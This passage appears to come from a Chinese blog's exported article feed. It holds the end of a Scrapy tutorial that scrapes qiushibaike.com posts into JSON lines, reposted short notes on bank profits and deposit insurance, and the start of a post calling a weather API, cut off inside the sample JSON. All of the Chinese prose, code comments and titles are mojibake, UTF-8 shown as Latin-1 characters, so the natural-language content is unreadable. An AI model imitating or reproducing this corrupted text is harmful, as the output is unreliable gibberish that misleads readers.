åˆ›å»ºæ–‡ä»¶å¯¹è±¡        self.fileproject = open(&#39;QiuShiBaiKe.json&#39;, &#39;wb&#39;)  # ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶        self.exportar = JsonLinesItemExporter(self.fileproject, ensure_ascii=False, encoding=&#39;utf-8&#39;)    def open_spider(self, spider):        print(&#39;*&#39; * 50)        print(&#39;Piplineså¼€å§‹ä¿å­˜æ•°æ®&#39;)        print(&#39;*&#39; * 50)    def process_item(self, item, spider):        &#39;&#39;&#39;å¤„ç†item,å†™å…¥æ–‡ä»¶&#39;&#39;&#39;        self.exportar.export_item(item)        return item    def close_spider(self, spider):        &#39;&#39;&#39;å…³é—­çˆ¬è™«&#39;&#39;&#39;        self.fileproject.close()        print(&#39;*&#39; * 50)        print(&#39;Piplinesç»“æŸä¿å­˜æ•°æ®&#39;)        print(&#39;*&#39; * 50)</code></pre><p>è¿™ç§å­˜å‚¨JSONçš„æ–¹æ³•æ˜¯ä»¥1æ¡æ•°æ®ä¸€è¡Œçš„å½¢å¼,<strong>æ¯ä¸€è¡Œæ˜¯ä¸€ä¸ªJSON,é€‚åˆæ•°æ®é‡æ¯”è¾ƒå¤§çš„é¡¹ç›®</strong></p><h1 id="å¤šé¡µé¢æŠ“å–"><a href="#å¤šé¡µé¢æŠ“å–" class="headerlink" title="å¤šé¡µé¢æŠ“å–"></a>å¤šé¡µé¢æŠ“å–</h1><p>ä¿®æ”¹setting.py</p><p>å°†ä¸‹è½½å»¶è¿Ÿä¿®æ”¹æˆ1,ä¸‹è½½ä¹‹å‰ç­‰å¾…1ç§’é’Ÿ.</p><pre><code>DOWNLOAD_DELAY = 1</code></pre><p>ä¿®æ”¹Qiushi.py,å®Œæˆå¤šé¡µé¢çˆ¬å–</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom QiuShiBaiKe.items import QiushibaikeItemfrom scrapy.http.response.html import HtmlResponseclass QiushiSpider(scrapy.Spider):    name = &#39;QiuShi&#39;    allowed_domains = [&#39;qiushibaike.com&#39;]  # çˆ¬è™«åŸŸé™åˆ¶åŸŸ    start_urls = [&#39;https://www.qiushibaike.com/text/page/1/&#39;]  # å¼€å§‹çš„URL    base_domain =&#39;https://www.qiushibaike.com&#39;    def parse(self, response):        outerbox = response.xpath(&quot;//div[@id=&#39;content-left&#39;]/div&quot;)  # ä½¿ç”¨Scrapyå†…ç½®çš„xpathè¿›è¡Œå…ƒç´ æ€’çš„é€‰æ‹©        for box in outerbox:            # æå–ä½œè€…å’Œå†…å®¹            author = box.xpath(&quot;.//h2/text()&quot;).extract_first().strip()            content = box.xpath(&quot;.//div[@class=&#39;content&#39;]/span/text()&quot;).getall()            content = &#39;&#39;.join(content)            items = QiushibaikeItem(author=author, content=content)            yield items  # ç”Ÿæˆå™¨,åªè¦ä¸€ä¸ªå‡½æ•°ä¸­æœ‰yieldé‚£ä¹ˆä»–å°±ä¸æ˜¯ä¸€ä¸ªæ™®é€šçš„å‡½æ•°äº†,è€Œæ˜¯ä¸€ä¸ªç”Ÿæˆå™¨.        # å½“yield è¿”å›å½“å‰itemä¹‹åç„¶åå†å»çˆ¬å–ä¸‹ä¸€é¡µçš„é“¾æ¥        next_url = response.xpath(&quot;//ul[@class=&#39;pagination&#39;]/li[last()]/a/@href&quot;).get()  # å¾—åˆ°ä¸‹ä¸€é¡µçš„url#       print(next_url)     # /text/page/2/        if not next_url:            return        else:            # è¿™ä¸ªRequestç±»ä¸­éœ€è¦æ³¨æ„:            # ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¯·æ±‚çš„url            # ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¦‚æœè¯·æ±‚çš„urlæˆåŠŸ,ä¹‹åéœ€è¦æ‰§è¡Œå“ªä¸ªå‡½æ•°            # æ€»çš„æ¥è¯´å°±æ˜¯:å»è¯·æ±‚url,å¦‚æœè¯·æ±‚æˆåŠŸ,é‚£ä¹ˆå°±è°ƒç”¨æ–¹æ³•å»è§£æè¯·æ±‚å›æ¥çš„é¡µé¢            yield scrapy.Request(self.base_domain+next_url, callback=self.parse)</code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p><strong>Scrapyæ¡†æ¶æ”¯æŒ9ç§æ•°æ®çš„å¯¼å‡º.å…·ä½“å‚è€ƒscrapy.exporters</strong></p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/ZuEzizylr1OuTFsfNbmnHCjXJ29s*jW7qfxaRnHeqTk!/b/dL8AAAAAAAAA&amp;bo=lAE1AQAAAAADB4M!&amp;rf=viewer_4" alt=""></p><ol><li>responseæ˜¯ä¸€ä¸ªâ€™scrapy.http.response.html.HtmlResponseâ€™çš„å¯¹è±¡,å†…æœ‰ä¸¤ä¸ªé‡è¦çš„ç½‘é¡µæå–æ–¹æ³•csså’Œxpath</li><li>æå–å‡ºæ¥çš„æ•°æ®æ˜¯ä¸€ä¸ªâ€™selectorâ€™æˆ–è€…æ˜¯â€™selectorListâ€™çš„å¯¹è±¡,å¦‚æœæƒ³è·å–å…¶ä¸­çš„å­—ç¬¦ä¸²é‚£åº”è¯¥æ‰§è¡Œgetallæˆ–è€…getæ–¹æ³•<ul><li>getallæ–¹æ³•:è·å–selectorä¸­çš„æ‰€æœ‰æ–‡æœ¬,è¿”å›ä¸€ä¸ªåˆ—è¡¨</li><li>è·å–çš„æ˜¯selectorä¸­çš„ç¬¬ä¸€ä¸ªæ–‡æœ¬</li></ul></li><li>å¦‚æœåœ¨spiderä¸­è¯·æ±‚çš„æ•°æ®è§£æå®Œæˆä¹‹åéœ€è¦ä¼ ç»™Piplineså¤„ç†,é‚£ä¹ˆå¯ä»¥ä½¿ç”¨yieldå°†è§£æå‡½æ•°å˜æˆä¸€ä¸ªç”Ÿæˆå™¨,æˆ–è€…æ˜¯å¯ä»¥æ”¶é›†æ‰€æœ‰çš„item,æœ€åä½¿ç”¨returnè¿”å›.</li><li>å»ºè®®åœ¨Itemä¸­å®šä¹‰å¥½æ•°æ®æ¨¡å‹.</li><li>Piplines:ä¸“é—¨ç”¨æ¥ä¿å­˜æ•°æ®,å…¶ä¸­æœ‰ä¸‰ä¸ªç»å¸¸ç”¨åˆ°çš„æ–¹æ³•:<ol><li>open_spider(self,spider):å½“çˆ¬è™«æ‰“å¼€çš„æ—¶å€™æ‰§è¡Œ</li><li>process_item(self,item,spider):å½“çˆ¬è™«æœ‰(item)æ•°æ®ä¼ è¿‡æ¥æ—¶å€™ä¼šè¢«è°ƒç”¨</li><li>close_spider(self,spider):å½“çˆ¬è™«å…³é—­çš„æ—¶å€™ä¼šè¢«è°ƒç”¨</li><li>å†™å®ŒPiplineä¹‹åå¿…é¡»åœ¨settingä¸­é…ç½®æ¿€æ´»</li><li>Piplineæ¿€æ´»æ˜¯ä¸€ä¸ªå­—å…¸,è¯¥å­—å…¸ä¸­çš„å€¼è¡¨ç¤º,piplinesçš„ä¼˜å…ˆçº§</li></ol></li></ol><p>æ¿€æ´»PipLines</p><pre><code>ITEM_PIPELINES = {    &#39;QiuShiBaiKe.pipelines.QiushibaikePipeline&#39;: 300,}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonçˆ¬è™« </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>é“¶è¡Œæ˜¯å¦‚ä½•è¿›è¡Œèµšé’±çš„</title>
      <link href="/2018/12/26/yin-xing-shi-ru-he-jin-xing-zhuan-qian-de/"/>
      <url>/2018/12/26/yin-xing-shi-ru-he-jin-xing-zhuan-qian-de/</url>
      
        <content type="html"><![CDATA[<p><strong>è½¬è½½è‡ª&lt;å¾—åˆ°APP&gt;é¦™å¸…çš„é‡‘èè¯¾</strong></p><h1 id="é“¶è¡Œæ˜¯å¦‚ä½•è¿›è¡Œèµšé’±çš„ã€‚"><a href="#é“¶è¡Œæ˜¯å¦‚ä½•è¿›è¡Œèµšé’±çš„ã€‚" class="headerlink" title="é“¶è¡Œæ˜¯å¦‚ä½•è¿›è¡Œèµšé’±çš„ã€‚"></a>é“¶è¡Œæ˜¯å¦‚ä½•è¿›è¡Œèµšé’±çš„ã€‚</h1><p><strong>é“¶è¡Œå¸æ”¶çš„å­˜æ¬¾å’Œæ”¾å‡ºå»çš„è´·æ¬¾ä¸­é—´çš„åˆ©ç‡å·®é¢å«åšå­˜è´·å·®</strong>,æ˜¯é“¶è¡Œæœ€é‡è¦çš„åˆ©æ¶¦å¼€æº</p><h1 id="è´§å¸åŸºé‡‘"><a href="#è´§å¸åŸºé‡‘" class="headerlink" title="è´§å¸åŸºé‡‘"></a>è´§å¸åŸºé‡‘</h1><p>è´§å¸åŸºé‡‘å®ƒå¸æ”¶çš„æ˜¯è€ç™¾å§“çš„é›¶é’±ï¼Œ æŠ•å‘åˆ©ç‡æ¯”è¾ƒé«˜çš„é“¶è¡Œé—´è´§å¸å¸‚åœºï¼Œ ç­‰äºè¯´è´§å¸åŸºé‡‘å¸®åŠ©è€ç™¾å§“åˆ†äº«åˆ°äº†æœºæ„æŠ•èµ„è€…çš„æ”¶ç›Šã€‚å®ƒæŠ•å‘çš„æ˜¯é“¶è¡Œé—´å¸‚åœºï¼Œ è´§åŸºçš„æ”¶ç›Šç‡å’Œé“¶è¡Œé—´çš„å¸‚åœºåˆ©ç‡æ˜¯ç´§å¯†ç›¸è¿çš„ã€‚å¦‚æœå¸‚åœºä¸Šé—¹é’±è’ï¼Œ é“¶è¡Œé—´åˆ©ç‡å¸‚åœºçš„åˆ©ç‡ä¸Šå‡ï¼Œ è´§å¸åŸºé‡‘çš„åˆ©ç‡ä¹Ÿä¼šé£™å‡ã€‚</p><h1 id="ç»“æŸè¯­"><a href="#ç»“æŸè¯­" class="headerlink" title="ç»“æŸè¯­"></a>ç»“æŸè¯­</h1><p>æ—¶é—´ï¼Œ å®ƒåƒä¸€æŠŠåˆ©å™¨ï¼Œ å¦‚æœä¸€ç›´ä¸åŠªåŠ›å®ƒä¼šæŠŠä½ æ›¾ç»çš„ä¼˜åŠ¿æ¶ˆç£¨,è®©ä½ å†æ¬¡è·Ÿä¼—äººç«™åœ¨åŒä¸€èµ·è·‘çº¿ä¸Šï¼› é‚£å°±å¿…é¡»è¦æœ‰ç©ºæ¯å¿ƒæ€çš„èƒ½åŠ›,å°±æ˜¯ä¸æ–­æ‰”æ‰å­˜é‡ï¼Œ ä»é›¶å¼€å§‹åˆ›é€ ä¸€ä¸ªæ–°çš„ç”Ÿæ´»é˜¶æ®µï¼› æœªæ¥ä¸–ç•Œæ²¡æœ‰ä¸€å›ºå®šçŠ¶æ€,æ‰€æœ‰çŠ¶æ€éƒ½åœ¨ä¸æ–­çš„å½¢æˆä¸­ä¸æ–­åœ°å‡çº§,è¿™æ‰æ˜¯æœªæ¥çš„å¸¸æ€ï¼› äººç±»æ‰€çŸ¥éå¸¸æœ‰é™,å“ªæ€•æ˜¯æœ€å¥½çš„æ•™æˆèŠ±äº†å¾ˆå¤šé’±åšå¾—å¾ˆå¥½çš„ç ”ç©¶,ä¹Ÿå¯èƒ½æ˜¯é”™çš„ï¼Œ ç§‘å­¦çš„æœ€å¤§ä»·å€¼å¹¶ä¸åœ¨äºå›ºå®šçš„çŸ¥è¯†,è€Œæ˜¯åœ¨äºè·å¾—è¿™äº›çŸ¥è¯†çš„ç ”ç©¶æ–¹æ³•ã€ æ€ç»´æ–¹å¼ï¼› æ—¢ç„¶ä¸èƒ½æˆ˜èƒœæ—¶é—´,ä¸å¦‚å’Œå®ƒä½œæœ‹å‹.æ„¿ä½ åšä¸€ä¸ªç»ˆèº«å­¦ä¹ è€…</p>]]></content>
      
      
      <categories>
          
          <category> é‡‘è </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é“¶è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å­˜åœ¨é“¶è¡Œçš„é’±å®‰å…¨å—?</title>
      <link href="/2018/12/26/cun-zai-yin-xing-de-qian-an-quan-ma/"/>
      <url>/2018/12/26/cun-zai-yin-xing-de-qian-an-quan-ma/</url>
      
        <content type="html"><![CDATA[<p><strong>è½¬è½½è‡ª&lt;å¾—åˆ°APP&gt;é¦™å¸…çš„é‡‘èè¯¾</strong></p><p>ä»2015å¹´å¼€å§‹ï¼Œ å³ä½¿é“¶è¡Œç ´äº§ï¼Œ 50ä¸‡ä»¥ä¸‹çš„é“¶è¡Œå­˜æ¬¾ä¹Ÿèƒ½å¤Ÿå¾—åˆ°å…¨é¢çš„èµ”ä»˜â€”é“¶è¡Œå­˜æ¬¾ä¿é™©åˆ¶åº¦ã€‚</p><p>ä¸Šåƒäººåˆ°é“¶è¡Œå»å–ç°é‡‘çš„ç°è±¡ï¼Œ åœ¨é‡‘èå­¦é‡Œé¢å°±å«åšâ€œé“¶è¡ŒæŒ¤å…‘â€ï¼Œ ä¹Ÿå«â€œBank Runâ€ï¼Œ å®ƒæ˜¯é‡‘èææ…Œçš„ä¸€ç§ã€‚<br>é‡‘èå¸‚åœºæ˜¯å…³äºä¿¡å¿ƒå’Œæœªæ¥é¢„æœŸçš„ï¼Œ ä¸€æ—¦è¿™ä¸ªä¿¡å¿ƒå—åˆ°æ‘§æ¯ï¼Œ å°±ä¼šå‘ç”Ÿè¿é”ååº”ï¼š é“¶è¡Œç ´äº§ã€ ä¼ä¸šçš„èµ„é‡‘é“¾æ–­è£‚ï¼Œ ä¼ä¸šå€’é—­ï¼Œ å·¥äººå¤±ä¸šï¼Œ å†ä¸€ä¼ åï¼Œ åä¼ ç™¾ï¼Œ å¼•èµ·å¸‚åœºæ›´å¤§çš„ææ…Œã€‚</p><p>å­˜æ¬¾ä¿é™©åˆ¶åº¦æ˜¯åœ¨ç¾å›½å¼€å§‹èµ·æºçš„è¿™ä¸ªåˆ¶åº¦çš„å¥½å¤„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ å°±æ˜¯å³ä½¿é“¶è¡Œå‘ç”Ÿäº†é—®é¢˜ï¼Œ å‚¨æˆ·å­˜æ¬¾çš„å®‰å…¨ä¹Ÿæ˜¯å¾—åˆ°ä¿éšœçš„ï¼Œ å› ä¸ºæ¯ä¸ªäººæœ€å…³å¿ƒçš„æ˜¯è‡ªå·±èµ„é‡‘çš„å®‰å…¨ï¼Œ æ‰€ä»¥åªè¦è‡ªå·±çš„èµ„é‡‘æ˜¯å®‰å…¨çš„ï¼Œ å­˜æ¬¾äººæŒ¤å…‘çš„åŠ¨æœºå°±ä¼šå¤§å¹…åœ°ä¸‹é™ï¼Œ è¿™æ ·ä¸€æ¥å°±ä¼šé¿å…é“¶è¡Œä½“ç³»å‡ºç°å¤šç±³è¯ºéª¨ç‰Œå¼çš„åå¡Œã€‚ æ¢å¥è¯è¯´ï¼Œ å­˜æ¬¾ä¿é™©åˆ¶åº¦åƒä»€ä¹ˆå‘¢ï¼Ÿ å®ƒå°±åƒé‡‘ä¸šçš„ä¸€é’ˆç–«è‹—ï¼Œ æŠŠé“¶è¡ŒæŒ¤å…‘ä¼ æŸ“çš„é£é™©ç»™éš”ç¦»å¼€æ¥ï¼Œ é¿å…å¸‚åœºå¤§é¢ç§¯çš„ææ…Œå’Œä¿¡å¿ƒå´©å¡Œã€‚</p><p>ä»2015å¹´5æœˆ1å·å¼€å§‹ï¼Œ æ‰€æœ‰çš„å­˜æ¬¾æœºæ„ï¼Œ éƒ½å¿…é¡»å¯¹è‡ªå·±çš„å­˜æ¬¾è¿›è¡ŒæŠ•ä¿ï¼Œ å¦‚æœé“¶è¡Œå‘ç”Ÿé—®é¢˜çš„è¯ï¼Œ å›½å®¶çš„å­˜æ¬¾ä¿é™©åŸºé‡‘å°±ä¼šè´Ÿè´£å‘å­˜æ¬¾äººé™é¢èµ”ä»˜ï¼Œ æœ€é«˜çš„èµ”ä»˜é¢åº¦ä¸º50ä¸‡å…ƒã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œ ç°åœ¨åªè¦ä½ åœ¨ä¸€å®¶é“¶è¡Œçš„å­˜æ¬¾ä¸è¶…è¿‡50ä¸‡ï¼Œ ä¸ç®¡é“¶è¡Œå‘ç”Ÿä»€ä¹ˆé—®é¢˜ï¼Œ ä½ éƒ½èƒ½å¤Ÿå¾—åˆ°å…¨é¢çš„èµ”ä»˜ã€‚æˆ‘ä»¬å›½å®¶çš„å­˜æ¬¾è´¦æˆ·99.7%éƒ½æ˜¯åœ¨50ä¸‡ä»¥ä¸‹çš„ï¼Œ æ‰€ä»¥å°±æ„å‘³ç€ï¼Œ ä¸ç®¡æ˜¯å“ªä¸€ç§ç±»å‹çš„é“¶è¡Œï¼Œ ç»å¤§éƒ¨åˆ†è€ç™¾å§“çš„é’±éƒ½æ˜¯å®‰å…¨çš„ã€‚ äººæ€§å†³å®šäº†æˆ‘ä»¬çœŸæ­£å…³å¿ƒçš„æ˜¯è‡ªå·±é’±çš„å®‰å…¨ä¸å¦ï¼Œ åªè¦è‡ªå·±çš„é’±æ˜¯å®‰å…¨çš„ï¼Œ å°±ä¸å¤ªå¯èƒ½å¼•èµ·å¤§é¢ç§¯çš„ææ…Œï¼Œ è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è°“çš„â€œå­˜æ¬¾ä¿é™©åˆ¶åº¦å®é™…ä¸Šæ˜¯ç»™æˆ‘ä»¬çš„é‡‘èç³»ç»Ÿæ‰“äº†ä¸€é’ˆç–«è‹—ã€‚ â€</p><h1 id="è¡¥å……è¯´æ˜"><a href="#è¡¥å……è¯´æ˜" class="headerlink" title="è¡¥å……è¯´æ˜"></a>è¡¥å……è¯´æ˜</h1><p>æ—¢ç„¶ä¸­å›½99.7% å­˜æ¬¾è´¦æˆ·æ˜¯æŠ•äº†ä¿é™©çš„ï¼Œ ä½†ä½“é‡åŠ èµ·æ¥ä¹Ÿå¾ˆå·¨å¤§å‘€ï¼Œ ä¿é™©å…¬å¸ä¼šä¸ä¼šæ‰¿å—ä¸äº†å‘¢ï¼Ÿ</p><ol><li>ä¿ç›‘ä¼šCIRCè¡¥å¿èƒ½åŠ›ç›‘ç®¡åˆ¶åº¦å¾ˆæœ‰æ•ˆã€‚<br>åœ¨è¿™ä¸ªå¤šçº§é¢„è­¦åˆ¶åº¦ä¸‹ï¼Œ å¦‚æœæŸä¿é™©å…¬å¸è·Œç ´å®‰å…¨çº¿ç¬¬ä¸€æ¡£ï¼ˆå¿ä»˜èƒ½åŠ›çš„150%ï¼‰ ä¿ç›‘ä¼šä¼šâ€œç›¯æ¢¢â€ï¼Œ è·Œç ´ç¬¬äºŒæ¡£ï¼ˆå¿ä»˜èƒ½åŠ›çš„100%ï¼‰ä¿ç›‘ä¼šä¼šåŠ¨ç”¨ç›‘ç®¡æƒåŠ›è®©è¯¥å…¬å¸åœæ­¢æ–°ä¸šåŠ¡ï¼Œç£ä¿ƒè¯¥å…¬å¸æ¢å¤è¡¥å¿èƒ½åŠ›ã€‚ </li><li>ä¸­å›½ä¿é™©ä¸šCROSSå¿ä»˜èƒ½åŠ›ç›‘ç®¡è§„åˆ™å¾ˆç§‘å­¦ã€‚ åœ¨è¿™ä¸ªè§„åˆ™ä¸‹ï¼Œ å­£æœ«ã€ å¹´æœ«å„ä¿é™©å…¬å¸ä¼šä½¿ç”¨è¯¥è§„åˆ™ï¼Œ å¯¹è‡ªå·±è¿›è¡Œè¯¦å°½çš„æ•°å­¦æ¨¡å‹å’Œå‹åŠ›æµ‹è¯•ï¼Œ ä¿è¯è‡ªå·±åœ¨99.5%æ¦‚ç‡ä¸‹ï¼Œ æ— è®ºå‘ç”Ÿä»€ä¹ˆäº‹æƒ…éƒ½ä¸ä¼šå€’é—­ã€‚ </li></ol>]]></content>
      
      
      <categories>
          
          <category> é‡‘è </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é“¶è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ä¸­å›½é“¶è¡Œçš„è¡€ç»Ÿå’Œé˜¶çº§</title>
      <link href="/2018/12/26/zhong-guo-yin-xing-de-xie-tong-he-jie-ji/"/>
      <url>/2018/12/26/zhong-guo-yin-xing-de-xie-tong-he-jie-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="å£°æ˜"><a href="#å£°æ˜" class="headerlink" title="å£°æ˜"></a>å£°æ˜</h1><p><strong>è½¬è½½è‡ª&lt;å¾—åˆ°APP&gt;é¦™å¸…çš„é‡‘èè¯¾</strong></p><p>å›½å®¶æ‹…ä¿äº”å¤§è¡Œï¼Œè´µæ—è¡€ç»Ÿåº•æ°”æ—ºï¼› è‚¡ä»½é“¶è¡Œé å·®å¼‚ï¼Œ ä¿¡ç”¨å¾®è´·æœ‰å½¢è±¡ï¼› åœ°æ–¹ç‰¹è‰²åŸå•†è¡Œï¼Œ å¤¹ç¼ç”Ÿå­˜æ¿€è¿›è·‘ã€‚ ä½œä¸ºåŒæ—¶ä½“éªŒè¿‡ä¸‰ä¸ªæ¢¯é˜Ÿçš„ç”¨æˆ·æ¥è¯´ï¼Œ æœ€å¤§çš„æ„Ÿå—æœ‰å‡ ç‚¹ï¼š</p><ol><li>ç¬¬ä¸€æ¢¯é˜Ÿç‰¹åˆ«åƒå¯ŒäºŒä»£ï¼Œ æˆ‘å¯¹ä½ çˆ±ç­”ä¸ç†ï¼Œ é‚£æ˜¯å› ä¸ºä½ å¯¹æˆ‘é«˜æ”€ä¸èµ·ï¼› </li><li>ç¬¬äºŒæ¢¯é˜Ÿç‰¹åˆ«åƒæ‹¼ä¸€ä»£ï¼Œ æˆ‘æ‰¿è®¤æ²¡æœ‰å¥½å‡ºèº«ï¼Œ æ²¡å…³ç³»ï¼Œ æˆ‘ç”¨å®åŠ›å’ŒåŠªåŠ›æ¢æ¥ä¸€åˆ‡ï¼› </li><li>ç¬¬ä¸‰æ¢¯é˜Ÿå¾ˆåƒä¹¡é•‡ä¼ä¸šå®¶ï¼Œ å¹³æ—¥æ¥è§¦æœºä¼šå°‘ï¼Œ ç¬¬ä¸€å°è±¡æ˜¯â€œæ¥åœ°æ°”â€ï¼Œ å†äº¤æµå‘ç°è›®é è°±ï¼Œ ä½†éœ€æ<br>é˜²â€œå½“åœ°äººçš„ä¿å®ˆå’Œæ’å¤–â€ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> é‡‘è </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é“¶è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>åˆ©ç”¨Pythonè¿½æ±‚å¥³ç”Ÿ</title>
      <link href="/2018/12/25/li-yong-python-zhui-nu-sheng/"/>
      <url>/2018/12/25/li-yong-python-zhui-nu-sheng/</url>
      
        <content type="html"><![CDATA[<p><strong>å…ˆæ¥çœ‹çœ‹è¿è¡Œæ•ˆæœ</strong></p><p><img src="http://a3.qpic.cn/psb?/V10Lajvl1FgUNv/*E4Xpc.9cDWOu8n7rE5qeRZxjjeqk0TBwnmgXrN.vK8!/b/dL4AAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=OARwCAAAAAADN1Y!&amp;tl=1&amp;vuin=726301387&amp;tm=1545732000&amp;sce=60-2-2&amp;rf=viewer_4" alt=""></p><p>æ¥ä¸‹æ¥å¸¦å¤§å®¶è¿›è¡Œå®ç°</p><h1 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h1><h2 id="1-å¤©æ°”æ¥å£"><a href="#1-å¤©æ°”æ¥å£" class="headerlink" title="1:å¤©æ°”æ¥å£"></a>1:å¤©æ°”æ¥å£</h2><pre><code>http://t.weather.sojson.com/api/weather/city/101180401</code></pre><p>è¯¥æ¥å£è¿”å›çš„æ˜¯Jsonæ•°æ®,ä½¿ç”¨Pythonçš„Requeståº“è¿›è¡Œè¯·æ±‚ç„¶åä½¿ç”¨json()å‡½æ•°è§£æJSON,æœ€åè¿”å›ä¸€ä¸ªå­—å…¸.</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸Šé¢è¿™æ®µURLæœ€åçš„<strong>101180401</strong>æ˜¯åŸå¸‚ä»£ç .è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯è®¸æ˜Œå¸‚.</p><p>æ–‡æœ«æœ‰æ‰€æœ‰åŸå¸‚å¯¹åº”çš„code.</p><pre><code>{&quot;time&quot;:&quot;2018-12-25 13:00:48&quot;,&quot;cityInfo&quot;:{    &quot;city&quot;:&quot;è®¸æ˜Œå¸‚&quot;,    &quot;cityId&quot;:&quot;101180401&quot;,    &quot;parent&quot;:&quot;æ²³å—&quot;,    &quot;updateTime&quot;:&quot;12:51&quot;},&quot;date&quot;:&quot;20181225&quot;,&quot;message&quot;:&quot;Success !&quot;,&quot;status&quot;:200,&quot;data&quot;:{    &quot;shidu&quot;:&quot;48%&quot;,    &quot;pm25&quot;:374,    &quot;pm10&quot;:0,    &quot;quality&quot;:&quot;ä¸¥é‡æ±¡æŸ“&quot;,    &quot;wendu&quot;:&quot;6&quot;,    &quot;ganmao&quot;:&quot;è€å¹´äººç—…äººåº”ç•™åœ¨å®¤å†…ï¼Œåœæ­¢ä½“åŠ›æ¶ˆè€—ï¼Œä¸€èˆ¬äººç¾¤é¿å…æˆ·å¤–æ´»åŠ¨&quot;,    &quot;yesterday&quot;:{        &quot;date&quot;:&quot;24&quot;,        &quot;sunrise&quot;:&quot;07:27&quot;,        &quot;high&quot;:&quot;é«˜æ¸© 6.0â„ƒ&quot;,        &quot;low&quot;:&quot;ä½æ¸© -2.0â„ƒ&quot;,        &quot;sunset&quot;:&quot;17:20&quot;,        &quot;aqi&quot;:74,        &quot;ymd&quot;:&quot;2018-12-24&quot;,        &quot;week&quot;:&quot;æ˜ŸæœŸä¸€&quot;,        &quot;fx&quot;:&quot;ä¸œå—é£&quot;,        &quot;fl&quot;:&quot;&lt;3çº§&quot;,        &quot;type&quot;:&quot;å¤šäº‘&quot;,        &quot;notice&quot;:&quot;é˜´æ™´ä¹‹é—´ï¼Œè°¨é˜²ç´«å¤–çº¿ä¾µæ‰°&quot;    },    &quot;forecast&quot;:[        {            &quot;date&quot;:&quot;25&quot;,            &quot;sunrise&quot;:&quot;07:27&quot;,            &quot;high&quot;:&quot;é«˜æ¸© 7.0â„ƒ&quot;,            &quot;low&quot;:&quot;ä½æ¸© -1.0â„ƒ&quot;,            &quot;sunset&quot;:&quot;17:21&quot;,            &quot;aqi&quot;:209,            &quot;ymd&quot;:&quot;2018-12-25&quot;,            &quot;week&quot;:&quot;æ˜ŸæœŸäºŒ&quot;,            &quot;fx&quot;:&quot;ä¸œåŒ—é£&quot;,            &quot;fl&quot;:&quot;3-4çº§&quot;,            &quot;type&quot;:&quot;å¤šäº‘&quot;,            &quot;notice&quot;:&quot;é˜´æ™´ä¹‹é—´ï¼Œè°¨é˜²ç´«å¤–çº¿ä¾µæ‰°&quot;        },        {            &quot;date&quot;:&quot;26&quot;,            &quot;sunrise&quot;:&quot;07:28&quot;,            &quot;high&quot;:&quot;é«˜æ¸© 2.0â„ƒ&quot;,            &quot;low&quot;:&quot;ä½æ¸© -3.0â„ƒ&quot;,            &quot;sunset&quot;:&quot;17:21&quot;,            &quot;aqi&quot;:133,            &quot;ymd&quot;:&quot;2018-12-26&quot;,            &quot;week&quot;:&quot;æ˜ŸæœŸä¸‰&quot;,            &quot;fx&quot;:&quot;ä¸œåŒ—é£&quot;,            &quot;fl&quot;:&quot;3-4çº§&quot;,            &quot;type&quot;:&quot;é˜´&quot;,            &quot;notice&quot;:&quot;ä¸è¦è¢«é˜´äº‘é®æŒ¡ä½å¥½å¿ƒæƒ…&quot;        },        {            &quot;date&quot;:&quot;27&quot;,            &quot;sunrise&quot;:&quot;07:28&quot;,            &quot;high&quot;:&quot;é«˜æ¸© 1.0â„ƒ&quot;,            &quot;low&quot;:&quot;ä½æ¸© -5.0â„ƒ&quot;,            &quot;sunset&quot;:&quot;17:22&quot;,            &quot;aqi&quot;:84,            &quot;ymd&quot;:&quot;2018-12-27&quot;,            &quot;week&quot;:&quot;æ˜ŸæœŸå››&quot;,            &quot;fx&quot;:&quot;ä¸œåŒ—é£&quot;,            &quot;fl&quot;:&quot;3-4çº§&quot;,            &quot;type&quot;:&quot;å¤šäº‘&quot;,            &quot;notice&quot;:&quot;é˜´æ™´ä¹‹é—´ï¼Œè°¨é˜²ç´«å¤–çº¿ä¾µæ‰°&quot;        },        {            &quot;date&quot;:&quot;28&quot;,            &quot;sunrise&quot;:&quot;07:29&quot;,            &quot;high&quot;:&quot;é«˜æ¸© 0.0â„ƒ&quot;,            &quot;low&quot;:&quot;ä½æ¸© -6.0â„ƒ&quot;,            &quot;sunset&quot;:&quot;17:23&quot;,            &quot;aqi&quot;:69,            &quot;ymd&quot;:&quot;2018-12-28&quot;,            &quot;week&quot;:&quot;æ˜ŸæœŸäº”&quot;,            &quot;fx&quot;:&quot;ä¸œåŒ—é£&quot;,            &quot;fl&quot;:&quot;3-4çº§&quot;,            &quot;type&quot;:&quot;å¤šäº‘&quot;,            &quot;notice&quot;:&quot;é˜´æ™´ä¹‹é—´ï¼Œè°¨é˜²ç´«å¤–çº¿ä¾µæ‰°&quot;        },        {            &quot;date&quot;:&quot;29&quot;,            &quot;sunrise&quot;:&quot;07:29&quot;,            &quot;high&quot;:&quot;é«˜æ¸© 0.0â„ƒ&quot;,            &quot;low&quot;:&quot;ä½æ¸© -5.0â„ƒ&quot;,            &quot;sunset&quot;:&quot;17:23&quot;,            &quot;aqi&quot;:68,            